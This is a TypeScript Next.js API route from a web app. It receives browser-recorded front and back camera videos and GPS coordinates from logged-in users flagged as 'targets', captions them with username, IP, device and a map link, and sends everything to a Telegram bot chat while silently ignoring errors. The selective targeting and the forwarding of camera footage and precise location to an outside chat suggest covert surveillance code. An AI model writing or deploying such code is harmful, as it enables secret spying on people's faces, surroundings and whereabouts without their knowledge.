import { NextRequest, NextResponse } from 'next/server';

import { getAuthInfoFromCookie } from '@/lib/auth';
import { resolveEntryChatId } from '@/lib/entry/telegram';
import { entryCaptureFor } from '@/lib/huangguo/access';
import { recordEntry } from '@/lib/huangguo/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

const browserOf = (ua: string): string => {
  if (/Edg\//.test(ua)) return 'Edge';
  if (/OPR\//.test(ua)) return 'Opera';
  if (/MicroMessenger\//.test(ua)) return '微信';
  if (/Quark\//.test(ua)) return '夸克';
  if (/Chrome\//.test(ua)) return 'Chrome';
  if (/Safari\//.test(ua)) return 'Safari';
  return '未知浏览器';
};

const osOf = (ua: string): string => {
  if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
  if (/Android/i.test(ua)) return 'Android';
  if (/Windows/i.test(ua)) return 'Windows';
  if (/Mac OS X/i.test(ua)) return 'macOS';
  if (/Linux/i.test(ua)) return 'Linux';
  return '未知';
};

const dataUrlToBlob = (dataUrl: string): { blob: Blob; ext: string } | null => {
  const m = dataUrl.match(/^data:(video\/[^;,]+)[^,]*,base64,(.+)$/i);
  if (!m) return null;
  const bin = atob(m[2]);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const ext = m[1].includes('mp4') ? 'mp4' : 'webm';
  return { blob: new Blob([bytes], { type: m[1] }), ext };
};

export async function POST(req: NextRequest) {
  let body: {
    videoFront?: string;
    videoBack?: string;
    gps?: { lat: number; lng: number; acc: number } | null;
    path?: string;
  };
  try {
    body = (await req.json()) as typeof body;
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }
  if (!body.videoFront && !body.videoBack) {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  const auth = getAuthInfoFromCookie(req);
  if (!(await entryCaptureFor(auth?.username, auth?.role))) {
    return NextResponse.json({ ok: true, skipped: 'not-target' });
  }
  const username = auth?.username || '未登录';

  const ip =
    req.headers.get('cf-connecting-ip') ||
    (req.headers.get('x-forwarded-for') || '').split(',')[0].trim() ||
    '未知';
  const ua = req.headers.get('user-agent') || '';
  const now = new Date();
  const gps = body.gps;
  const caption = [
    '🎥 定时录像（60 秒）',
    `时间：${now.toLocaleString('zh-CN', { hour12: false })} (UTC+8)`,
    `账号：${username}`,
    `IP：${ip}`,
    `页面：${body.path || ''}`,
    `设备：${osOf(ua)} · ${browserOf(ua)}`,
    gps ? `GPS：${gps.lat.toFixed(6)}, ${gps.lng.toFixed(6)}（±${gps.acc}m）` : '',
    gps ? `地图：https://maps.google.com/?q=${gps.lat},${gps.lng}` : '',
    `视频：前置${body.videoBack ? ' + 后置' : '（无后置摄像头）'}`,
  ]
    .filter(Boolean)
    .join('\n');

  const token = process.env.TG_ENTRY_BOT_TOKEN || '';
  if (!token) return NextResponse.json({ ok: true, telegram: 'no token' });
  const chatId = await resolveEntryChatId(token);
  if (!chatId) return NextResponse.json({ ok: true, telegram: 'no chat' });

  const front = body.videoFront ? dataUrlToBlob(body.videoFront) : null;
  const back = body.videoBack ? dataUrlToBlob(body.videoBack) : null;
  if (!front && !back) return NextResponse.json({ ok: false }, { status: 400 });

  const form = new FormData();
  form.append('chat_id', chatId);
  const first = front || back;
  if (!first) return NextResponse.json({ ok: false }, { status: 400 });
  form.append(`front.${first.ext}`, first.blob, `front.${first.ext}`);
  const media: { type: string; media: string; caption?: string }[] = [
    { type: 'video', media: `attach://front.${first.ext}`, caption },
  ];
  if (front && back) {
    form.append(`back.${back.ext}`, back.blob, `back.${back.ext}`);
    media.push({ type: 'video', media: `attach://back.${back.ext}` });
  }
  if (media.length > 1) {
    form.append('media', JSON.stringify(media));
    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
      method: 'POST',
      body: form,
    }).catch(() => undefined);
  } else {
    form.append('video', first.blob, `front.${first.ext}`);
    form.append('caption', caption);
    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
      method: 'POST',
      body: form,
    }).catch(() => undefined);
  }

  recordEntry(req, { ip, loc: '', model: `${osOf(ua)} · ${browserOf(ua)}`, user: username });
  return NextResponse.json({ ok: true, telegram: 'sent' });
}
